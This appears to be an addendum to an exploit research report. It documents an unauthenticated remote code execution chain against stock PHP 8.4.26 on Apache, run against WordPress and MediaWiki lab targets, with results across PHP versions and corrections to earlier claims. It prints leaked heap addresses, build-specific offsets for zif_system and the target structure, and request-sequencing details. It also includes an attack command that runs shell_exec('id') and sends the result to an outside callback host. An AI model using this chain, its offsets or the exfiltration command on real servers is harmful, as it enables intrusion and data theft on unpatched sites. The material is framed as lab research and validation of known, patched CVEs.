| Crash | Apache child 19 | `zend_mm_heap corrupted`, `SIGABRT` (6) |

Receipt: `receipts/wp_b1front_try1/result.json` and `receipts/wp_b1front_try1.log`.  
Separate control: A1 directly on `/index.php` hits `Maximum execution time of 60+2 seconds exceeded`; B1 then aborts a child with `zend_mm_heap corrupted`. Both are in `receipts/wp_apache_crash_log.txt`.

The reason is not an LFI or a config setting. The WordPress front controller runs application code (bootstrap, query, theme) during the request, which changes the heap/request shape before and after the multipart/session callback. The fake session-id page used by B1 is calibrated for the quiet core silence endpoint; the front controller's allocations prevent the same fake-id reclaim. This is an **app-shape sensitivity of B1**, not a failure of the A2/B2 code-execution stage.

**Quantification:** B1 `/index.php` after a valid A1 had **0/1** leak stages (one attempt; the i=4 B1 request was 0 bytes) and one abort. B1 `/wp-content/index.php` under the same build had **6/6** leak stages. The front-controller B1 path is therefore 0/1, not a success.

**B2 was not the failing stage.** After a valid leak from `/wp-content/index.php`, the same `S`/`zif_system` values executed on `/index.php` (attempt 901) and on `/` (attempts 903, 930–932). No B2 offset recalibration was needed and no B2 failure was observed once B1 leaked. The application shape changed the B1 reclaim, not the A2/B2 heap-targeting offsets. The requirement's "app shape changes S/hsv and B2 fails" condition did **not** occur here; the analogous failure is at B1.

### 3.2 Full chain on the core silence endpoint

All four stages on `/wp-content/index.php`:

| Attempt | A1 | B1 | A2 | B2 | Proof |
|---|---|---|---|---|---|
| 900 | `500`, 211 B, child 17 | i=4, `200`, **1,679,266 B**, child 17 | `500`, 211 B, child 18 | i=5, connection closed, 0 B, child 18 | `uid=33` + `WP9BIE_ADDENDUM_900_b5` |
| 901 | `500`, 211 B, child 18 | i=4, `200`, **1,693,780 B**, child 18 | `500`, 211 B, child 28 | i=5, connection closed, 0 B, child 28 | `uid=33` + `WP9BIE_ADDENDUM_901_b5` |
| 903 | `500`, 211 B, child 18 | i=4, `200`, **1,656,714 B**, child 18 | `500`, 211 B, child 19 | i=4, connection closed, 0 B, child 19 | `uid=33` + `WP9BIE_ADDENDUM_903_b4` |
| 930 | `500`, 211 B, child 18 | i=4, `200`, **1,686,090 B**, child 18 | `500`, 211 B, child 28 | i=5, connection closed, 0 B, child 28 | `uid=33` + `WP9BIE_FRESH_930_b5` |
| 931 | `500`, 211 B | i=4, `200`, 1,685,134 B | `500`, 211 B | i=5, connection closed | `uid=33` + `WP9BIE_FRESH_931_b5` |
| 932 | `500`, 211 B | i=4, `200`, 1,685,056 B | `500`, 211 B | i=5, connection closed | `uid=33` + `WP9BIE_FRESH_932_b5` |

- B1 response is an HTTP `200 OK` whose body begins with a forged `Set-Cookie`/`PHPSESSID` header and decodes to **819,208 bytes** of heap data. The raw response is 1.65–1.69 MB.
- A1/B1 are sent with `Transfer-Encoding: chunked` and no `Content-Length`; the 1,060,211-byte A1 and 33,128,677-byte B1 are therefore not stopped by stock `post_max_size=8M`. No `php_value` was changed.
- A2 is a `500` with 211 bytes (OOM).
- B2 often has **no HTTP status**: the response is empty/connection closed because `system()` executes and the child then crashes with `SIGSEGV`. The proof file is written before/while the connection dies. This is a successful RCE, not a missing HTTP receipt.
- Every success killed exactly one prefork child with `SIGSEGV`; Apache respawned it. Accessibility checks after the attempt returned `200 OK` / `301`.
- All WordPress attempts in this addendum used the **single-A2 route**, not the broadcast route. The original report's 5/5 broadcast result remains the broadcast evidence; this addendum's 6/6 is single-A2.

Concrete leak for attempt 900:

```
decoded window:   819,208 bytes
zval_ptr_dtor:    0x7fbb9b161b60  (lib + 0x65EB60)
libphp base:      0x7fbb9ab03000
main candidates:  0x7fbb98e00000 (87 hits), 0x7fbb98600000 (79 hits)
S = main + 0xF8398 = 0x7fbb98ef8398
zif_system = lib + 0x465370 = 0x7fbb9af68370
```

Attempt 903 used a different ASLR slide:

```
libphp base:      0x7f596ef11000
main:             0x7f596d200000
S:                0x7f596d2f8398
zif_system:       0x7f596f376370
```

Receipts:

- `receipts/wp_content_try1/result.json` (attempt 900)
- `receipts/wp_cross_front_try1/result.json` (attempt 901: B1 on `/wp-content/index.php`, A2/B2 on `/index.php`)
- `receipts/wp_callout_try1/result.json` (attempt 903: B1 on `/wp-content/index.php`, A2/B2 on `/`, `/tmp` + callback)
- `receipts/wp_fresh_930/`, `receipts/wp_fresh_931/`, `receipts/wp_fresh_932/`

### 3.3 Realistic exfiltration: `/tmp` + local HTTP callback

Attempt 903 used:

```
id>/tmp/p1_a903
echo WP9BIE_ADDENDUM_903_b0>>/tmp/p1_a903
php -r "file_get_contents('http://p2s-cb:19090/WP9BIE_ADDENDUM_903_b0/'.rawurlencode(shell_exec('id')));"
```

Result:

- Target-side file `/tmp/p1_a903`:
  ```
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  WP9BIE_ADDENDUM_903_b4
  ```
- Callback receiver `p2s-cb:19090` logged:
  ```
  2026-10-22T14:17:21Z 192.168.144.7 /WP9BIE_ADDENDUM_903_b4/uid%3D33%28www-data%29%20gid%3D33%28www-data%29%20groups%3D33%28www-data%29%0A
  ```
- Both the target file and the callback contain `uid=33`; the callback additionally proves outbound network exfiltration without `/out`.

`/out` is **not** used in this addendum. The new target has no `/out` directory and no `/out` bind mount. All new proofs are `/tmp` files plus the HTTP callback. The `/out/p1_aN` paths in the original report are lab-only evidence and should not be presented as a realistic deployment requirement.

### 3.4 Worker IDs and crash attribution

Request index is the zero-based position in a stage's connection sequence, not a static worker ID. On a fresh 5-worker generation, B1 index 4 reaches the A1 child; B2 index 4/5 reaches the A2/B2 child. Apache child PIDs from the access log and crash log:

| Attempt | A1 child | B1 hit child | A2 child | B2 hit child | Crash |
|---|---|---|---|---|---|
| 900 | 17 | 17 (i=4) | 18 | 18 (i=5) | 18 `SIGSEGV` |
| 901 | 18 | 18 (i=4) | 28 | 28 (i=5) | 28 `SIGSEGV` |
| 903 | 18 | 18 (i=4) | 19 | 19 (i=4) | 19 `SIGSEGV` |
| 930 | 18 | 18 (i=4) | 28 | 28 (i=5) | 28 `SIGSEGV` |

Sources: `receipts/worker_attribution_addendum.tsv`, target access log (per-child PID), and `receipts/wp_apache_crash_log.txt`.

This is the correction to the "single-worker required" claim: the stock target had **five** workers, not one. B1 succeeds because the fifth request in the fresh sequence lands on the A1 child. The single-worker control was a diagnostic, not a prerequisite.

### 3.5 Fresh vs warm reliability

Fresh WordPress series (each attempt starts with a `docker restart`, confirmed by the Apache startup log):

| Attempt | B1 | A2 | B2 | Proof |
|---|---|---|---|---|
| 930 | i=4, 1,686,090 B | i=0, 500 | i=5, empty | `WP9BIE_FRESH_930_b5` |
| 931 | i=4, 1,685,134 B | i=0, 500 | i=5, empty | `WP9BIE_FRESH_931_b5` |
| 932 | i=4, 1,685,056 B | i=0, 500 | i=5, empty | `WP9BIE_FRESH_932_b5` |

**Fresh: 3/3.** Including attempts 900, 901, and 903, the addendum has **6/6 fresh full-chain successes** across the three path variants (core B1, front-controller A2/B2, root A2/B2).

Warm series, **no restart** after 932:

| Attempt | B1 i=4 | Outcome |
|---|---|---|
| 940 | `200`, 1,688,468 B | rejected as `implausible_delta`; no proof |
| 941 | empty (0 B) | no leak |
| 942 | empty (0 B) | no leak |
| 943 | `200`, 256 B | normal response, no leak |

**Warm: 0/4.** The 940 response is a **false positive**, not a valid leak: it decoded to 819,208 bytes and contained plausible heap pointers (`lib=0x7f0219f66000`, `zdtor=0x7f021a5c4b60`), but its candidate main bases were `0x7f0216800000`, `0x7f0216a00000`, and `0x7f0212200000`; none gives the expected lib−main delta of roughly `0x1A00000..0x1F00000` (the observed deltas were ~`0x3766000`, ~`0x3566000`, and ~`0x7D66000`). The driver correctly rejected it. There was no `S`/`zif` derivation and no proof.

The original report's minimal-target warm rate was **1/4**; this addendum's WordPress warm rate is **0/4**. Do not merge them into a single universal rate; both show that warm state is a real reliability hazard, while fresh restart is deterministic for this build.

Warm failure modes observed:

- A1 on a heap already shaped by prior traffic aborts the child with `zend_mm_heap corrupted` (e.g. 14:29:22, children 18 and 28).
- A1 can return 500 but leave the worker in a state where B1 i=4 is empty rather than a leak.
- A1 can return a normal 256-byte response with no poisoned child.
- Crashed children are replaced, but the replacement does not restore the clean fresh layout.

### 3.6 WordPress front-controller qualification

The real-app result is **qualified**:

- **Pass:** B1 on the stock core `/wp-content/index.php` silence file; A2/B2 on `/` or `/index.php`; `uid=33` proof.
- **Fail:** B1 on the front controller `/index.php`; no leak.
- **Not claimed:** B1 on `/`; `/` is used for the A2/B2 stage, not as a B1 endpoint in this evidence.
- **Do not claim:** "WordPress front controller is exploitable end-to-end with B1 on `/index.php`." The leak endpoint is a core file, not the front controller.

This still satisfies a real-application test because `/wp-content/index.php` is a stock WordPress core PHP file served by the stock app, no plugin/theme/auth, and the code execution afterward is on the front controller/root. It does not satisfy a stricter "B1 must be on `/index.php`" requirement.

## 4. MediaWiki results

### 4.1 Front controller

`/index.php?title=Main_Page`:

| Stage | Result |
|---|---|
| A1 | `500`, 211 B, child 18 |
| B1 i0–i3, i5 | `200`, 36,814–36,815 B, MediaWiki page |
| B1 i4 | empty, 0 B |
| Crash | child 18 `zend_mm_heap corrupted`, `SIGABRT` |
| Post-health | `200 OK`, 36,709 B |

Receipt: `receipts/mw_front_try1/result.json`; log: `receipts/mw_front_try1.log`; crash excerpt: `receipts/mw_apache_crash_log.txt`.

### 4.2 `action=render`

`/index.php?title=Main_Page&action=render`:

- A1 `500`, 211 B.
- B1 all attempts `200`, 2,493 B, no leak.
- No proof.

Receipt: `receipts/mw_render_try1/result.json`.

### 4.3 `/opensearch_desc.php`

- A1 `500`, 211 B, child 18.
- B1 i0–i3/i5 `308`, 463 B.
- B1 i4 empty, 0 B; child 18 heap corruption.
- No leak, no proof.

Receipt: `receipts/mw_opensearch_try1/result.json`.

### 4.4 MediaWiki verdict

**No full chain on MediaWiki 1.46.2 with this B1 shape.** The front controller's application work changes the heap and prevents the fake-id reclaim, just as with WordPress `/index.php`. `action=render` and the OpenSearch endpoint do not provide a quieter stock endpoint that preserves the B1 leak. No MediaWiki-specific LFI/config or third-party extension was used.

This is a **real-app negative result**. It does not show MediaWiki is unexploitable in general; it shows this chain's B1 is not portable to the tested MediaWiki endpoints.

## 5. PHP-version portability

### 5.1 Version/build/offset matrix

| PHP | Image | `libphp.so` SHA-256 | Build ID | `zif_system` | `zval_ptr_dtor` | A1 result | B1 result | Chain |
|---|---|---|---|---|---|---|---|---|
| 8.4.26 | `php:8.4.26-apache` | `51663cf883b1223436d4c99f31dd0225735ea5573665e4242621eee7f4ee679c` | `a534a5c4a890b378ef6c227590627d531eafa8ce` | `0x465370` | `0x65eb60` | `500` OOM, 211 B | leak at i=4 | **RCE** (WordPress) |
| 8.4.27 | `php:8.4.27-apache` | `992b4b07fd4880b2dd5be75a4912e0dc619ca08e1a4ff0c7eac0dce4c1aa7c31` | `3390aa5b732751726ea7ca20ed22c74f36349a2d` | `0x46ad70` | `0x66a620` | `200 OK`, 259 B | all `200`, 259 B, no leak | no RCE |
| 8.5.11 | `php:8.5.11-apache` | `2c80ca2a245ca1ccca9946f30ebeca210b9689bc24f2bd07eda717d70108ee5d` | `13ba090198423880ce5847c4e3f92c48f2385a72` | `0x5996e0` | `0x7b47a0` | `500` OOM, 275 B | i=4 `200`, 195 B, no leak | no RCE (stock A1) |
| 8.5.12 | `php:8.5.12-apache` | `18b19b1bce5cf2d2daf20a104e26ced44112ceb12d83f156b7d9a76d8d5b4285` | `8cf5855333c9c697dc1a41891fd890da50d82a1d` | `0x59fae0` | `0x7c11a0` | `200 OK`, 259 B | all `200`, 259 B, no leak | no RCE |

These version controls use the official `php:*-apache` images and a minimal `index.php` to isolate the PHP build; they are not additional minimal-target chain claims. The real-application claims above rest on the WordPress/MediaWiki targets.

Stock INI hashes:

- 8.4.26 / 8.4.27: md5 `fba97f0b3e0b19b0980f5102c0440480`, SHA-256 `8d6fcbbcff186958a3609e277f8db249122a89d01e8401b1861f5bd4283f148a`
- 8.5.11 / 8.5.12: md5 `8129780caefbc488f992aad67b80ae1f`, SHA-256 `40bb01691e2189f6cf1f9e2c4a29aa42f99b97944ba98f7b02036f50d3774116`

Fixed-version `.resp` receipts:

- `receipts/ver_8427_try1/` (A1 `200 OK`, 259 B; B1 all `200`, 259 B, no leak)
- `receipts/ver_8512_try1/` (same)
- `receipts/ver_8511_try1/` (A1 `500`, 275 B; B1 i=4 `200`, 195 B, no leak; all other B1 `200`, 259 B)
- `receipts/version_matrix.tsv`

### 5.2 PHP 8.5.11: affected, but not reproducible with this A1

8.5.11 is in the advisory-affected range (`< 8.5.12`) and must be treated as vulnerable in general. It is **not** fixed. However, the stock 8.4.26 A1 body does **not** produce the required OOM window on 8.5.11.

Observed A1 state, dumped with gdb after the same A1 body (1,060,211 B; SHA-256 `8e8fc166...`):

| Build | A1 status | `PS(id)` | `send_cookie` | `status` | id offset (B1 page) | A1 state file |
|---|---|---|---|---|---|---|
| 8.4.26 | `500`, 211 B | valid 32-byte id | **1** | 2 | `-0x4c9000` (`0x137`) | `receipts/state_8426.txt` |
| 8.5.11 | `500`, 275 B | valid 32-byte id | **0** | 2 | `-0x4ca000` (`0x136`) | `receipts/state_8511.txt` |

8.4.26 A1 state (excerpt):

```
STATE ps=0x7f2bada96820 heap=0x7f2baaa00040 main=0x7f2baaa00000 id=0x7f2baa537000 idoff=0x-4c9000 md=0x7f2baaa57230 hsv=0x0 hsvoff=NULL status=2 send_cookie=1
IDLEN 0x20
```

8.5.11 A1 state (excerpt):

```
STATE ps=0x7f46bff71a40 heap=0x7f46bcc00040 main=0x7f46bcc00000 id=0x7f46bc736000 idoff=0x-4ca000 md=0x7f46bcc57230 hsv=0x0 hsvoff=NULL status=2 send_cookie=0
IDLEN 0x20
```

The 8.5.11 diagnostic target used for these dumps has the same `libphp.so` Build ID `13ba090198423880ce5847c4e3f92c48f2385a72` and SHA-256 `2c80ca2a...` as the official `php:8.5.11-apache` image. The 8.5.11 OOM lands at a different point: `send_cookie` is already `0` (consistent with the OOM occurring after the cookie send/inside later flush work), whereas 8.4.26 still has `send_cookie=1` (inside the send-cookie window). The B1 fake-id page is consequently not the freed/stranded id page.

B1 covers the A1 child at i=4, so the miss is not a routing failure:

- B1 i=4: `200 OK`, **195 B** (`OK\n`-style normal response), no `Set-Cookie` leak.
- B1 i0–i3/i5: `200 OK`, 259 B, no leak.
- Page sweep `0x120`–`0x150` inclusive (49 pages), all B1 i=4 responses 195 B and no leak; `receipts/sweep_8511_page.log`.
- A1 calibration variants (burners 16–36, tail 0–6, progress_len 1000–8000, parts/big grid) did not produce `send_cookie=1`; burners 22+ leave no session, lower burners OOM earlier with `PS(id)=NULL`. Receipts: `receipts/try_a1_8511*.log`, `receipts/state_8511.txt`.

**Conclusion:** 8.5.11 is affected but this chain is not portable to it without a new A1 groom. Do not claim 8.5.11 is patched and do not claim the stock chain works there.

### 5.3 PHP 8.4.27 and 8.5.12: fixed

Both patched builds return:

- A1: `HTTP/1.1 200 OK`, 259 B, **no OOM**.
- B1: every attempt `200 OK`, 259 B, no leak, no crash.
- No proof, no RCE.

This is the expected fixed behavior after `506e87fa`, which removes the longjmp OOM exit and resets session globals at `MULTIPART_EVENT_START`. The chain's A1 no longer creates the poisoned child, so B1 has nothing to leak.

### 5.4 What is version-specific

- `S = main + 0xF8398` and the B1 fake-id page (`0x137`) are specific to the 8.4.26 WordPress/core-endpoint heap shape.
- `zif_system` and `zval_ptr_dtor` offsets are build-specific: 8.4.26, 8.4.27, 8.5.11, and 8.5.12 all differ.
- The B1 body hash `b6c547e0...` is fixed for this build/shape; the B2 body is regenerated per leak because it embeds the ASLR-derived `S`/`zif`.
- The A1 body is fixed (`8e8fc166...`); no host or target calibration was used.
- 8.5.11 has a different id page (`0x136`) and no `send_cookie=1`; a different A1 groom would be required.

## 6. Corrections to prior claims

### 6.1 "A single worker is required" — false

The main target used stock prefork **5/150** (five workers), no `zz-single.conf`, no sticky worker, no keep-alive pinning. The observable pattern is:

- A1 hits one child.
- The next four B1 requests hit the other four children; B1 request index 4 wraps to the A1 child and leaks.
- A2 then hits a child (often the next one), and B2 rotates until it reaches the A2-poisoned child (index 4 or 5).
- All successful WordPress runs followed this pattern with five workers.

The single-worker control was only a diagnostic to prove the bodies/driver work and to measure no-retry failure (5/6). It is not a deployment requirement and should not be described as one.

### 6.2 "B-worker 0/9" — a no-retry/attribution artifact, not a chain failure rate

A B1/B2-only run without the matching A1/A2 poison cannot succeed by construction:

- B1 needs the A1 child's stale `PS(id)`/`PS(rfc1867_progress)`; sending B1 to arbitrary workers or without A1 produces no leak.
- B2 needs the B1 leak's `S`/`zif` and the A2-poisoned child; without those, it cannot place the fake structures.
- A "0/9" B-worker result is therefore a sequencing/attribution artifact, not evidence that the chain fails. The valid measurement is the full A1→B1→A2→B2 sequence with per-child rotation.
- On a fresh 5-worker generation, all 6 WordPress successes leaked at B1 index 4; B2 hit at index 4 or 5. No-retry full-chain failure is real but small on a fresh single worker (5/6), and much larger warm (1/4 original; 0/4 here).

### 6.3 "20/20" — unsupported by retained receipts

No retained receipt supports a 20/20 claim. The verified fresh figures are:

- original report: **5/5** broadcast A2/B2 and **4/4** single-A2/B2;
- this addendum: **6/6** fresh WordPress full-chain variants (900, 901, 903, 930, 931, 932);
- no-retry control: **5/6**;
- warm: **1/4** original minimal target, **0/4** WordPress here.

A 20/20 claim is inconsistent with the retained warm/no-retry failures and should not be repeated without receipts. If an earlier draft claimed 20/20, correct it to the receipted numbers above.

### 6.4 "Warm reliability" — fresh vs warm must be separated

- Fresh restart restores deterministic behavior for this exact build: 6/6 fresh full-chain successes across the WordPress variants.
- Warm, no-restart is unreliable: 0/4 here, 1/4 in the original minimal target.
- A single warm B1 response can be a large, pointer-containing **false positive** (attempt 940) without a plausible lib−main delta; do not count it as a leak.
- The original report's 1/4 warm result and this addendum's 0/4 are separate target/app measurements; do not merge them into a universal "25%" or "0%" rate.

### 6.5 "Real app" — qualified, not unqualified

- WordPress: pass with B1 on stock core `/wp-content/index.php`; A2/B2 on `/` or `/index.php`; `uid=33` proof.
- WordPress: fail for B1 on `/index.php`; `/` is not claimed as a B1 endpoint, only as an A2/B2 target.
- MediaWiki: fail for the tested endpoints; no proof.
- Do not claim "front-controller-only WordPress RCE" or "MediaWiki RCE" from this evidence.

### 6.6 "New vulnerability" — no

The chain exploits two known, patched CVEs. The novel part is the exploit/groom, not the vulnerability. Any claim of a new CVE/0-day is unsupported.

### 6.7 Worker crash / one-shot / broadcast side effects

- Every successful B2 ends with a child `SIGSEGV` (or, on some failures, `SIGABRT`/`zend_mm_heap corrupted`). The code execution is effectively one-shot per poisoned child.
- A1/A2 OOM themselves can abort children even when the chain fails; failed attempts are noisy and reduce availability.
- Broadcast A2/B2 increases the chance of hitting the right child but causes multiple OOM/crash side effects; the single-A2 route is enough on a fresh 5-worker generation.
- The B1 response is a 1.65–1.69 MB heap dump; this is not stealthy.
- Apache respawns crashed children and health checks recover, but warm heap state remains degraded.

## 7. Final verdict against the stock-bar checklist

| Criterion | Verdict | Evidence |
|---|---|---|
| Unauthenticated | **PASS** | No credentials, cookies, login, or auth bypass; all stage requests are unauthenticated; proof `uid=33(www-data)` |
| No LFI | **PASS** | No include/path traversal; only core multipart/session handling; B1 on stock core `/wp-content/index.php` |
| No third-party file write (same-chain allowed) | **PASS** | No plugin/theme/webroot write; webroot read-only; only post-RCE `/tmp` proof and HTTP callback |
| Stock defaults | **PASS (qualified)** | Stock prefork 5/150; stock `php.ini-production`; no `php_value`; only vhost log format changed; WordPress core endpoint |
| ASLR on | **PASS** | Distinct lib/main bases per fresh attempt (e.g. `0x7fbb...`, `0x7f9b...`, `0x7f59...`, `0x7fba...`); S/zif derived from leak |
| No single/sticky worker | **PASS (qualified)** | Five workers; B1 i=4 reaches A1 child; B2 rotation; no single-worker config. Per-child targeting is still required |
| All requested PHP versions (8.4.26, 8.5.11, 8.4.27, 8.5.12) | **FAIL** | 8.4.26 works; 8.5.11 advisory-affected but stock A1 does not reproduce; 8.4.27/8.5.12 fixed |
| Real app — WordPress core-endpoint route | **PASS (qualified)** | Full chain with B1 on stock core `/wp-content/index.php`; A2/B2 on `/` or `/index.php`; `uid=33` proof; no active plugins/auth |
| Real app — front-controller-only or MediaWiki | **FAIL** | B1 on WordPress `/index.php` has no leak; MediaWiki front controller, `action=render`, and `/opensearch_desc.php` all fail at B1 |
| New vulnerability | **FAIL** | CVE-2026-109618 + CVE-2026-109619, both known and patched; not a new bug |

**Overall:** the stock-bar claim is **conditionally true only for the measured PHP 8.4.26 WordPress target with B1 on the core silence endpoint**. It is not true as a general "stock PHP 8.5 / all real apps / front-controller-only / new vulnerability" claim. The honest summary is:

> Blind, unauthenticated RCE works on stock PHP 8.4.26 + Apache prefork 5/150 + stock `php.ini-production` against WordPress 7.1.3, using the stock core `/wp-content/index.php` for the B1 leak and `/` or `/index.php` for A2/B2, with `/tmp` + HTTP callback exfiltration as `uid=33`. It is a concrete exploit of CVE-2026-109618 and CVE-2026-109619, not a new vulnerability; it does not reproduce on PHP 8.5.11 with the stock A1, and it fails on MediaWiki and on WordPress front-controller B1.

## 8. Receipts and integrity

### 8.1 Primary receipts

| Receipt | Contents |
|---|---|
| `receipts/wp_content_try1/result.json` | WordPress attempt 900: full chain on `/wp-content/index.php`; B1 i=4 1,679,266 B; proof `WP9BIE_ADDENDUM_900_b5` |
| `receipts/wp_cross_front_try1/result.json` | Attempt 901: B1 `/wp-content/index.php`; A2/B2 `/index.php`; proof `WP9BIE_ADDENDUM_901_b5` |
| `receipts/wp_callout_try1/result.json` | Attempt 903: B1 `/wp-content/index.php`; A2/B2 `/`; `/tmp` + callback; proof `WP9BIE_ADDENDUM_903_b4` |
| `receipts/wp_callout_try1/proof_903.txt` | `uid=33...` + marker from target `/tmp/p1_a903` |
| `receipts/callback.log` | HTTP callback with URL-encoded `uid=33` |
| `receipts/wp_fresh_930`..`932` | 3/3 fresh WordPress successes; B1 i=4; proofs |
| `receipts/wp_warm_940`..`943` | 0/4 warm no-restart failures; 940 false-positive leak |
| `receipts/wp_b1front_try1` | Front-controller B1 failure; 0-byte i=4; child abort |
| `receipts/mw_front_try1`, `mw_render_try1`, `mw_opensearch_try1` | MediaWiki negative results |
| `receipts/ver_8427_try1`, `ver_8512_try1`, `ver_8511_try1` | Version matrix controls |
| `receipts/state_8426.txt`, `state_8511.txt` | A1 session-global state dumps |
| `receipts/sweep_8511_page.log` | 49-page 8.5.11 B1 sweep; all no leak |
| `receipts/try_a1_8511*.log` | 8.5.11 A1 calibration attempts |
| `receipts/worker_attribution_addendum.tsv` | Stage→child PID mapping |
| `receipts/version_matrix.tsv` | Version/build/offset matrix |
| `receipts/wp_apache_crash_log.txt`, `mw_apache_crash_log.txt` | Crash excerpts |
| `receipts/wp_content_try1/proof_900.txt`, `receipts/wp_fresh_930/proof_930.txt` | Additional target-side proofs |

### 8.2 Body hashes

| Body | Bytes | SHA-256 |
|---|---|---|
| A1 | 1,060,211 | `8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6` |
| B1 | 33,128,677 | `b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2` |
| A2 | 279,369 | `7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236` |
| B2 first (attempt 900) | 451,384 | `9f1f93c456a6df0f6611d99c7b9ca87f233f0da3e0957d11e6019902d6c10b9e` |

The A1/B1 bodies reproduce the original hashes; B2 is regenerated per ASLR leak, so its hash is attempt-specific.

### 8.3 Proof hashes

| Proof | SHA-256 |
|---|---|
| `/tmp/p1_a900` (`receipts/wp_content_try1/proof_900.txt`) | `076ea41a4c53aedb8d3f646bb58b3ea6448e67dcb2f379651a3db34e2f0a28e8` |
| `/tmp/p1_a901` (`receipts/wp_cross_front_try1/proof_901.txt`) | `fa39cfcc45977749eaf25b07be48503960aa80d71fb798b0ed20cc00f78a7f97` |
| `/tmp/p1_a903` (`receipts/wp_callout_try1/proof_903.txt`) | `c541acb7f726807a9e5107dd26251ad8e2eaf2fedd38245b23decd2b6b8f6970` |
| `/tmp/p1_a930` (`receipts/wp_fresh_930/proof_930.txt`) | `7db0363df8e9570d5348bbc9b8636f192069b5a51c8ae5ac74bbec87f1fca41f` |
| `/tmp/p1_a931` (`receipts/wp_fresh_931/proof_931.txt`) | `3a1ac817bd97963ca0e50bfadf93bdbb4f9bb0cdc71ad92abaa6061132a005cd` |
| `/tmp/p1_a932` (`receipts/wp_fresh_932/proof_932.txt`) | `b280cdee444828def0038badb0ac79c7d44b67aa82623b2c5a72ef81561ebb04` |

### 8.4 Integrity

The addendum directory has its own `SHA256SUMS` covering `addendum.md`, `scripts/`, `bodies/`, `receipts/`, and the public lab configs. Lab `wp-config.php` and `LocalSettings.php` are excluded because they contain deployment credentials; no credentials are reproduced in this report. Verify with:

```bash
cd /tmp/opencode/research/9bie_addendum_20261022T160000Z
sha256sum -c SHA256SUMS
```

The repository is still at `aeb5dcc6acc79c1d9a31c023b4f8ceb43103e5a7` with `git status --porcelain` empty. No repo edits, commits, or pushes were made.

No IDA/IDB artifact applies to this task; this is a PHP/Apache/HTTP lab, not a native-binary reverse-engineering run. The relevant artifacts are the Docker containers/images, PHP sources, bodies, receipts, and logs listed above.

## 9. What would change the conclusion

1. **PHP 8.5.11:** a new A1 groom that ends with `send_cookie=1` and a freed/stranded `PS(id)` page, followed by a B1 calibrated to that page. The current stock 8.4.26 A1 does not.
2. **WordPress front controller:** a B1 body calibrated for the front-controller heap shape (or a stock core no-op endpoint other than `/wp-content/index.php`) that produces the same fake-id reclaim.
3. **MediaWiki:** a stock no-op PHP endpoint that survives the B1 callback without application allocations, or a MediaWiki-shape B1.
4. **Patched builds:** no change; 8.4.27/8.5.12 A1 no longer OOMs and B1 has no stale state.

Until then, the result is a **fresh-server, PHP 8.4.26, WordPress-core-endpoint** result, not a universal stock-PHP or all-real-app result.
